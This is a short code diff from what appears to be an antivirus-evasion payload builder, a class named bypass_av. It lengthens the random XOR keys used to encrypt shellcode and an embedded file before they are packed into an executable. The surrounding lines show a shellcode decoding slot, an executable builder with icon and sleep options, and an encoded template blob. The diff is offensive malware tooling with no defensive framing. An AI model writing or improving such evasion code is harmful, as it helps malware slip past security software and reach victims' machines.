@@ -1289,7 +1289,7 @@ class bypass_av(object):
         else:
             src = bav.src
             
-        sc_key = rand_bytes(rand_int(4, 8))
+        sc_key = rand_bytes(rand_int(16, 32))
         sc = exor(sc, sc_key)
             
         # decode shellcode at slot_1
@@ -1316,7 +1316,7 @@ class bypass_av(object):
             return bav.single_exe(sc, icon, sleep, modify, libs)
             
         file_bytes, file_ext_name = file_tuple[0], file_tuple[1]
-        file_key = rand_bytes(rand_int(4, 8))
+        file_key = rand_bytes(rand_int(16, 32))
         file_bytes = exor(file_bytes, file_key)
         
         slot_2 = dtxt(b'H4sIAP7VBmMC/3MJ9w9yUUjLzEmNL86sSlWwVShKTUyJLwByc/JLNAx1FPxCfXw0rXm5AsL8PaEqUxJLEoEqE3Ny8pM14HpBitA1w5VrWgMAPyalt2oAAAA=')+'\n'
